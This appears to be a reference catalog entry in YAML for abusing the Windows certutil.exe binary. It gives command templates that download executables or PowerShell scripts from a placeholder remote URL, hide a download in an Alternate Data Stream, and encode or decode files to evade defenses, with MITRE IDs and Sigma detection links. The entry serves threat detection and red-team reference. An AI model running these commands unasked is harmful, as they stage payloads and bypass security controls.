      document_utf8: "---\nName: Certutil.exe\nDescription: Windows binary used for handling certificates\n\
        Author: Oddvar Moe\nCreated: 2018-05-25\nCommands:\n  - Command: certutil.exe -urlcache -f {REMOTEURL:.exe}\
        \ {PATH:.exe}\n    Description: Download and save an executable to disk in the current folder.\n\
        \    Usecase: Download file from Internet\n    Category: Download\n    Privileges: User\n    MitreID:\
        \ T1105\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows\
        \ 11\n  - Command: certutil.exe -verifyctl -f {REMOTEURL:.exe} {PATH:.exe}\n    Description: Download\
        \ and save an executable to disk in the current folder when a file path is specified, or `%LOCALAPPDATA%low\\\
        Microsoft\\CryptnetUrlCache\\Content\\<hash>` when not.\n    Usecase: Download file from Internet\n\
        \    Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem: Windows\
        \ vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n  - Command: certutil.exe\
        \ -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt\n    Description: Download and save a .ps1\
        \ file to an Alternate Data Stream (ADS).\n    Usecase: Download file from Internet and save it\
        \ in an NTFS Alternate Data Stream\n    Category: ADS\n    Privileges: User\n    MitreID: T1564.004\n\
        \    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n\
        \  - Command: certutil.exe -URL {REMOTEURL:.exe}\n    Description: Download and save an executable\
        \ to `%LOCALAPPDATA%low\\Microsoft\\CryptnetUrlCache\\Content\\<hash>`.\n    Usecase: Download\
        \ file from Internet\n    Category: Download\n    Privileges: User\n    MitreID: T1105\n    OperatingSystem:\
        \ Windows 10, Windows 11\n    Tags:\n      - Application: GUI\n  - Command: certutil -encode {PATH}\
        \ {PATH:.base64}\n    Description: Command to encode a file using Base64\n    Usecase: Encode\
        \ files to evade defensive measures\n    Category: Encode\n    Privileges: User\n    MitreID:\
        \ T1027.013\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10,\
        \ Windows 11\n  - Command: certutil -decode {PATH:.base64} {PATH}\n    Description: Command to\
        \ decode a Base64 encoded file.\n    Usecase: Decode files to evade defensive measures\n    Category:\
        \ Decode\n    Privileges: User\n    MitreID: T1140\n    OperatingSystem: Windows vista, Windows\
        \ 7, Windows 8, Windows 8.1, Windows 10, Windows 11\n  - Command: certutil -decodehex {PATH:.hex}\
        \ {PATH}\n    Description: Command to decode a hexadecimal-encoded file.\n    Usecase: Decode\
        \ files to evade defensive measures\n    Category: Decode\n    Privileges: User\n    MitreID:\
        \ T1140\n    OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows\
        \ 11\nFull_Path:\n  - Path: C:\\Windows\\System32\\certutil.exe\n  - Path: C:\\Windows\\SysWOW64\\\
        certutil.exe\nDetection:\n  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_download.yml\n\
        \  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_certutil_encode.yml\n\
